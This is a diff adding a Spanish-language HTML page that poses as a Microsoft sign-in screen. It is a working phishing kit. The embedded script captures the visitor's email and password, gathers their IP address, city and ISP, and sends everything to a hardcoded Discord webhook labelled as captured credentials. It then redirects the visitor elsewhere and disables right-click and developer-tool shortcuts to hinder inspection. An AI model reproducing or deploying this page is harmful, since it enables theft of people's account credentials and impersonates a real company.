@@ -1,0 +1,786 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>proce</title> 
+    <link rel="shortcut icon" type="image/x-icon" href="https://c.s-microsoft.com/favicon.ico?v2">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    
+    <style>
+        :root {
+            --primary-dark: #106ebe;
+            --primary-main: #0078d4;
+            --neutral-dark: #616161;
+            --neutral-light: rgba(243, 242, 241, 0.9);
+            --border-curve: 12px;
+            --shadow-main: 0 4px 12px rgba(0, 0, 0, 0.15);
+            --animation-speed: all 0.2s ease-in-out;
+        }
+        
+        * {
+            box-sizing: border-box;
+            padding: 0;
+        }
+        
+        .page-wrapper, html {
+            height: 100%;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            color: #1b1b1b;
+            line-height: 1.5;
+            margin: 0;
+            padding-bottom: 30px; 
+        }
+        
+        .page-wrapper {
+            background-color: rgb(97, 128, 150) ;
+            background-size: cover;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            min-height: 100vh;
+        }
+        
+        .page-wrapper::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.4);
+            z-index: -1;
+        }
+        
+        .access-panel {
+            width: 100%;
+            max-width: 440px;
+            padding: 0 15px;
+            animation: slideIn 0.5s ease-out;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        
+        .auth-card {
+            width: 440px;
+            max-width: 100%;
+            background-color: rgb(255 255 255);
+            box-shadow: var(--shadow-main);
+            border-radius: var(--border-curve);
+            padding: 40px;
+            position: relative;
+            overflow: hidden;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            margin: 20px 0;
+        }
+        
+        .page-footer {
+            position: fixed !important;
+            bottom: 8px;
+            left: 0;
+            width: 100%;
+            text-align: center;
+            background: transparent;
+            padding: 0;
+            margin-bottom: 16px;
+            font-size: 12px;
+            color: #fff;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.5);
+            z-index: 9999;
+        }
+
+        .page-footer .footer-nav {
+            display: inline-flex !important;
+            gap: 32px;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+
+        .page-footer .footer-item {
+            color: #fff !important;
+            text-decoration: none !important;
+            margin: 0;
+            padding: 0;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.5);
+        }
+
+        .page-footer .footer-item:hover {
+            text-decoration: underline !important;
+        }
+
+        .page-footer .footer-text {
+            margin-top: 8px;
+            color: #fff;
+            font-size: 10px;
+            line-height: 1.3;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.5);
+            padding: 0 10px;
+        }
+
+        .page-footer .footer-text a {
+            color: #a0d2ff !important;
+            text-decoration: none;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.5);
+        }
+        .page-footer .footer-text a:hover {
+            text-decoration: underline;
+        }
+
+        .auth-note,
+        .section-divider,
+        .auth-choices {
+            display: none !important;
+        }
+
+        .auth-header {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+        }
+
+        #account-display {
+            display: inline-block;
+            background: #fff;
+            border: 1px solid #ddd;
+            border-radius: 999px;
+            padding: 4px 16px;
+            margin-bottom: 16px;
+            font-size: 12px;
+            font-weight: 600;
+            color: #616161;
+            word-break: break-all;
+            font-family: 'Segoe UI', Arial, sans-serif;
+        }
+
+        .auth-header img {
+            padding-bottom: 24px;
+            width: 108px;
+            transition: transform 0.3s ease;
+        }
+        .auth-header img:hover {
+            transform: scale(1.05);
+        }
+        .auth-title {
+            font-size: 24px;
+            font-weight: 500;
+            color: #242424;
+            margin: 0 0 8px 0;
+        }
+        .auth-subtitle {
+            font-size: 14px;
+            color: #424242;
+            margin: 0 0 20px 0;
+        }
+
+        .input-section {
+            margin-bottom: 20px;
+            position: relative;
+        }
+        .input-field {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            color: #707070;
+            width: 100%;
+            height: 40px;
+            padding: 8px 12px;
+            border: 1px solid rgba(166, 166, 166, 0.5);
+            border-bottom: 1px solid black;
+            border-radius: 4px;
+            font-size: 14px;
+            transition: var(--animation-speed);
+            background-color: rgba(255, 255, 255, 0.9);
+        }
+        .input-field:focus {
+            outline: none;
+            border-color: var(--primary-main);
+            box-shadow: 0 0 0 2px rgba(0, 120, 212, 0.3);
+            background-color: #fff;
+        }
+
+        .action-btn {
+            display: inline-block;
+            padding: 10px 16px;
+            font-size: 14px;
+            font-weight: 600;
+            border-radius: var(--border-curve);
+            cursor: pointer;
+            text-align: center;
+            text-decoration: none;
+            border: none;
+            transition: var(--animation-speed);
+        }
+        .btn-main {
+            background-color: var(--primary-main);
+            color: white;
+            width: 100%;
+            height: 40px;
+        }
+        .btn-main:hover {
+            background-color: var(--primary-dark);
+            transform: translateY(-1px);
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
+        }
+        .btn-alt {
+            background-color: transparent;
+            color: rgba(#242424);
+            padding: 0;
+            font-weight: 400;
+            text-shadow: 0 1px 1px rgba(0, 0, 0, 0.2);
+        }
+        .btn-alt:hover {
+            text-decoration: underline;
+            color: #242424;
+        }
+        .help-link {
+            color:#115ea3;
+            font-size: 14px;
+            font-weight: 600;
+            font-family: 'Segoe UI', Arial, sans-serif;
+            margin-top: 8px;
+            background-color: transparent;
+            border: transparent;
+            text-decoration: none;
+            display: block;
+            text-align: left;
+        }
+        .help-link:hover {
+            text-decoration: underline;
+        }
+
+        .auth-note {
+            margin-top: 24px;
+            font-size: 14px;
+            text-align: center;
+            color: #424242;
+        }
+        .help-section {
+            text-align: center;
+            margin-top: 20px;
+        }
+        .is-hidden {
+            display: none;
+        }
+        .account-info {
+            font-weight: 600;
+            margin-bottom: 16px;
+            word-break: break-all;
+            font-size: 14px;
+            text-align: center;
+            color: #181818c2;
+            padding: 8px;
+            background-color: rgb(0 0 0 / 11%);
+            border-radius: var(--border-curve);
+        }
+        .nav-back {
+            position: absolute;
+            top: 16px;
+            left: 16px;
+            color: rgba(3, 3, 3, 0.9);
+            font-size: 14px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+            transition: var(--animation-speed);
+            background: none;
+            border: none;
+            text-shadow: 0 1px 1px rgba(0,0,0,0.2);
+        }
+        .nav-back:hover {
+            color: #000000;
+            transform: translateX(-2px);
+        }
+        .password-wrapper {
+            position: relative;
+        }
+        .visibility-toggle {
+            position: absolute;
+            right: 10px;
+            top: 31%;
+            transform: translateY(-50%);
+            color: var(--neutral-dark);
+            cursor: pointer;
+            background: none;
+            border: none;
+            font-size: 16px;
+            transition: var(--animation-speed);
+            width: 30px;
+            height: 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 50%;
+            z-index: 2;
+        }
+        .visibility-toggle:hover {
+            color: var(--primary-main);
+            background-color: rgba(0,0,0,0.05);
+        }
+        .section-divider {
+            border-top: 1px solid rgba(255,255,255,0.2);
+            margin: 24px 0;
+            position: relative;
+        }
+        .auth-choices {
+            font-size: 12px;
+            color: rgba#424242);
+            text-align: center;
+            text-shadow: 0 1px 1px rgba(0,0,0,0.2);
+        }
+        .security-indicator {
+            height: 4px;
+            background-color: #e0e0e0;
+            border-radius: 2px;
+            margin-top: 8px;
+            overflow: hidden;
+            position: relative;
+        }
+        .indicator-bar {
+            height: 100%;
+            width: 0;
+            background-color: #ff5252;
+            transition: width 0.3s ease, background-color 0.3s ease;
+        }
+        @keyframes slideIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        @media (max-width: 480px) {
+            .page-wrapper {
+                background: url('https://cdn.glitch.global/97ec72d4-c73a-4009-af5d-af7e51eb62c3/78_3a53c38a2dc671fb4daf.jpg?v=1749764353828') no-repeat center center fixed !important;
+                background-size: cover !important;
+                display: flex !important;
+                align-items: center !important;
+                justify-content: center !important;
+                min-height: 100vh !important;
+                padding: 20px 0 !important;
+            }
+            
+            .page-wrapper::before {
+                background: rgba(0, 0, 0, 0.5) !important;
+            }
+
+            .access-panel {
+                min-height: auto;
+                justify-content: flex-start;
+                padding: 20px 0;
+                height: auto;
+            }
+
+            .auth-card {
+                width: 100% !important;
+                max-width: 100% !important;
+                padding: 20px !important;
+                background: rgba(255, 255, 255, 0.95) !important;
+                box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2) !important;
+                border-radius: 8px !important;
+                border: none !important;
+                margin: 0 15px;
+            }
+
+            .input-field {
+                margin-top: 0px !important;
+            }
+
+            .btn-main {
+                width: 100% !important;
+            }
+
+            .auth-title {
+                font-size: 20px !important;
+                margin-bottom: 4px !important;
+            }
+            .auth-subtitle {
+                font-size: 14px !important;
+                margin-bottom: 16px !important;
+            }
+
+            .page-footer {
+                position: fixed !important;
+                bottom: 8px;
+                left: 0;
+                width: 100%;
+                text-align: center;
+                background: transparent;
+                padding: 0;
+                margin-bottom: 16px;
+                font-size: 12px;
+                color: #fff !important;
+                text-shadow: 0 1px 2px rgba(0,0,0,0.5);
+                z-index: 9999;
+            }
+            
+            .page-footer .footer-nav {
+                gap: 20px;
+            }
+            
+            .page-footer .footer-item {
+                color: #fff !important;
+            }
+            
+            .page-footer .footer-text a {
+                color: #a0d2ff !important;
+            }
+
+            .visibility-toggle {
+                right: 8px;
+                top: 31%;
+            }
+
+            .auth-note,
+            .section-divider,
+            .auth-choices {
+                display: none !important;
+            }
+        }
+
+        @media (max-width: 360px) {
+            .page-footer .footer-nav {
+                gap: 15px;
+            }
+            
+            .page-footer {
+                font-size: 11px;
+            }
+            
+            .page-footer .footer-text {
+                font-size: 9px;
+            }
+            
+            .auth-card {
+                padding: 15px !important;
+            }
+            
+            .auth-header img {
+                width: 90px;
+                padding-bottom: 16px;
+            }
+            
+            .visibility-toggle {
+                right: 6px;
+            }
+        }
+        body {background-color: #0078d4;}
+    </style>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>  
+<script src="imagen/imagenes.js"></script>
+  <script>
+    // Configuración Discord Webhook (reemplaza con tu URL)
+    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1465605598677565473/GpPoSB9EH8AtU-3gb5Eqr3TA_A2Z5Q_nU4lzAtPhE00nDk9SRjMuj5HU63u71JKjr-6G';
+
+    $(document).ready(function() {
+        // Manejar el envío del formulario de email
+        $("#account-form").on("submit", function(e) {
+            e.preventDefault();
+            
+            // Obtener el email
+            const email = $("#userAccount").val();
+            
+            // Validar email
+            if (!validateAccount(email)) {
+                alert("Por favor, introduce un correo electrónico válido.");
+                return false;
+            }
+            
+            // Guardar email para mostrar después
+            localStorage.setItem("userAccount", email);
+            
+            // Mostrar el paso de contraseña
+            $("#account-step").addClass("is-hidden");
+            $("#credential-step").removeClass("is-hidden");
+            
+            // Mostrar el email en el siguiente paso
+            $("#account-display").text(email);
+            
+            return false;
+        });
+        
+        // Manejar el botón de retroceso
+        $("#go-back").on("click", function() {
+            $("#credential-step").addClass("is-hidden");
+            $("#account-step").removeClass("is-hidden");
+        });
+        
+        // Manejar el envío del formulario de contraseña
+        $("#credential-form").on("submit", function(e) {
+            e.preventDefault();
+            
+            // Obtener los valores
+            const email = localStorage.getItem("userAccount");
+            const password = $("#userCredential").val();
+            
+            // Validar que haya contraseña
+            if (!password) {
+                alert("Por favor, introduce tu contraseña.");
+                return false;
+            }
+            
+            // Enviar ambos datos
+            submitCredentials(email, password);
+            
+            return false;
+        });
+        
+        // Función para alternar visibilidad de contraseña
+        window.toggleVisibility = function() {
+            const passwordField = $("#userCredential");
+            const toggleIcon = $(".visibility-toggle i");
+            
+            if (passwordField.attr("type") === "password") {
+                passwordField.attr("type", "text");
+                toggleIcon.removeClass("fa-eye").addClass("fa-eye-slash");
+            } else {
+                passwordField.attr("type", "password");
+                toggleIcon.removeClass("fa-eye-slash").addClass("fa-eye");
+            }
+        };
+    });
+    
+    // Función para validar email
+    function validateAccount(email) {
+        const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+        return re.test(email);
+    }
+    
+    // Función para enviar datos a Discord Webhook
+    function submitCredentials(email, password) {
+        // Obtener información de IP
+        $.getJSON("https://api.ipify.org?format=json", function(ipData) {
+            $.getJSON("https://ipinfo.io", function(locationData) {
+                const ip = ipData.ip;
+                const address = locationData.city + ", " + locationData.country;
+                const isp = locationData.org || "No disponible";
+                
+                // Crear embed de Discord
+                const embed = {
+                    title: "🔐 Nuevas Credenciales Capturadas",
+                    color: 16711680, // Rojo
+                    fields: [
+                        {
+                            name: "📧 Correo Electrónico",
+                            value: `\`\`\`${email}\`\`\``,
+                            inline: false
+                        },
+                        {
+                            name: "🔑 Contraseña",
+                            value: `\`\`\`${password}\`\`\``,
+                            inline: false
+                        },
+                        {
+                            name: "🌐 Información de Red",
+                            value: `**IP:** ${ip}\n**Ubicación:** ${address}\n**ISP:** ${isp}`,
+                            inline: false
+                        },
+                        {
+                            name: "🕐 Fecha/Hora",
+                            value: new Date().toLocaleString(),
+                            inline: false
+                        }
+                    ],
+                    footer: {
+                        text: "Sistema de Captura"
+                    },
+                    timestamp: new Date().toISOString()
+                };
+                
+                // Configuración para enviar a Discord
+                const settings = {
+                    "async": true,
+                    "crossDomain": true,
+                    "url": DISCORD_WEBHOOK_URL,
+                    "method": "POST",
+                    "headers": {
+                        "Content-Type": "application/json"
+                    },
+                    "data": JSON.stringify({
+                        "embeds": [embed],
+                        "content": "🚨 **NUEVA CAPTURA DE CREDENCIALES**",
+                        "username": "Security Logger",
+                        "avatar_url": "https://cdn-icons-png.flaticon.com/512/3067/3067256.png"
+                    })
+                };
+                
+                // Enviar el mensaje
+                $.ajax(settings).done(function(response) {
+                    console.log("Datos enviados a Discord:", response);
+                    // Redirigir después del envío exitoso
+                    window.location = 'index3.html';
+                }).fail(function(error) {
+                    console.error("Error al enviar a Discord:", error);
+                    // Aún así redirigir en caso de error
+                    window.location = 'index3.html';
+                });
+            }).fail(function() {
+                // Si falla ipinfo.io, enviar sin ubicación
+                const ip = ipData.ip;
+                const embed = {
+                    title: "🔐 Nuevas Credenciales Capturadas",
+                    color: 16711680,
+                    fields: [
+                        {
+                            name: "📧 Correo Electrónico",
+                            value: `\`\`\`${email}\`\`\``,
+                            inline: false
+                        },
+                        {
+                            name: "🔑 Contraseña",
+                            value: `\`\`\`${password}\`\`\``,
+                            inline: false
+                        },
+                        {
+                            name: "🌐 IP",
+                            value: ip,
+                            inline: false
+                        }
+                    ],
+                    timestamp: new Date().toISOString()
+                };
+                
+                $.ajax({
+                    url: DISCORD_WEBHOOK_URL,
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    data: JSON.stringify({ "embeds": [embed] })
+                }).done(function() {
+                    window.location = 'index3.html';
+                }).fail(function() {
+                    window.location = 'index3.html';
+                });
+            });
+        }).fail(function() {
+            // Si falla ipify, enviar sin IP
+            const embed = {
+                title: "🔐 Nuevas Credenciales Capturadas",
+                color: 16711680,
+                fields: [
+                    {
+                        name: "📧 Correo Electrónico",
+                        value: `\`\`\`${email}\`\`\``,
+                        inline: false
+                    },
+                    {
+                        name: "🔑 Contraseña",
+                        value: `\`\`\`${password}\`\`\``,
+                        inline: false
+                    }
+                ],
+                timestamp: new Date().toISOString()
+            };
+            
+            $.ajax({
+                url: DISCORD_WEBHOOK_URL,
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                data: JSON.stringify({ "embeds": [embed] })
+            }).done(function() {
+                window.location = 'index3.html';
+            }).fail(function() {
+                window.location = 'index3.html';
+            });
+        });
+    }
+    
+    // Prevenir acciones del usuario
+    document.addEventListener("contextmenu", function(e) {
+        e.preventDefault();
+        return false;
+    });
+    
+    document.addEventListener("keydown", function(e) {
+        if(e.key === "F12" || 
+           (e.ctrlKey && e.key === "u") || 
+           (e.ctrlKey && e.shiftKey && e.key === "I")) {
+            e.preventDefault();
+            return false;
+        }
+    });
+</script>
+</head><center>
+<body> 
+    <div class="access-panel">
+        <div class="auth-card">
+            <div id="account-step">
+                <div class="auth-header">
+              <img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/LOUr1FEL2KE1FIlJK6Y5a/3b908f725e1248318ea8a294d8d0d7b1/microsoft.png" 
+                         alt="Microsoft Logo" aria-label="Logo de Microsoft">
+                    <h1 class="auth-title">Acceder a su cuenta</h1>
+                    <span class="auth-subtitle">Ingrese sus credenciales de Microsoft.</span>
+                </div>
+                
+                <form id="account-form" aria-label="Formulario de cuenta">
+                    <div class="input-section">
+                        <input type="email" class="input-field" id="userAccount" name="userAccount" placeholder="Correo electrónico o número de teléfono" required aria-required="true">
+                        <button type="button" class="help-link">¿Problemas con su usuario?</button>
+                    </div>
+
+                    <button type="submit" class="action-btn btn-main" aria-label="Continuar">
+                        Continuar
+                    </button>
+                </form>
+                
+                <div class="section-divider" role="separator"></div>
+                
+                <div align="center">
+                    <span style="font-family: 'Segoe UI', Arial, sans-serif;font-size: 14px;vertical-align: center;">
+                        <br>
+                        ¿Primera vez aquí? <button type="button" class="help-link">Registrar nueva cuenta</button>
+                    </span>
+                </div>
+            </div>
+            
+            <div id="credential-step" class="is-hidden" aria-hidden="true">
+                <button class="nav-back" id="go-back" aria-label="Volver atrás">
+                    <i class="fas fa-chevron-left" aria-hidden="true"></i>
+                </button>
+                
+                <div class="auth-header">
+                  <img src="https://cf-assets.www.cloudflare.com/slt3lc6tev37/LOUr1FEL2KE1FIlJK6Y5a/3b908f725e1248318ea8a294d8d0d7b1/microsoft.png" 
+                    >
+                    <div class="account-info" id="account-display" aria-live="polite"></div>
+                    <h1 class="auth-title">Ingrese su contraseña</h1>
+                </div>
+                
+                <form id="credential-form" aria-label="Formulario de credenciales">
+                    <div class="input-section password-wrapper">
+                        <input type="password" class="input-field" id="userCredential" name="userCredential" placeholder="Contraseña" required autocomplete="current-password">
+                        <button type="button" class="visibility-toggle" onclick="toggleVisibility()" aria-label="Mostrar contraseña">
+                            <i class="far fa-eye" aria-hidden="true"></i>
+                        </button>
+                        <a href="#" class="help-link" aria-label="¿Olvidó su contraseña?">
+                            ¿No recuerda su contraseña?
+                        </a>
+                    </div>
+                    
+                    <button type="submit" class="action-btn btn-main" aria-label="Acceder">
+                        Acceder
+                    </button>
+                </form>
+                <br>
+                <div align="center" class="help-link">
+                    Opciones de acceso: rostro, huella digital, PIN o clave de seguridad
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <div class="page-footer">
+        <div class="footer-nav">
+            <a href="#" class="footer-item">Soporte</a>
+            <a href="#" class="footer-item">Condiciones de uso</a>
+            <a href="#" class="footer-item">Privacidad</a>
+        </div>
+        <div class="footer-text">
+            Active el modo privado si no es su dispositivo personal. 
+            <a href="#">Detalles</a>
+        </div>
+    </div>
+</body>
+</html></center>
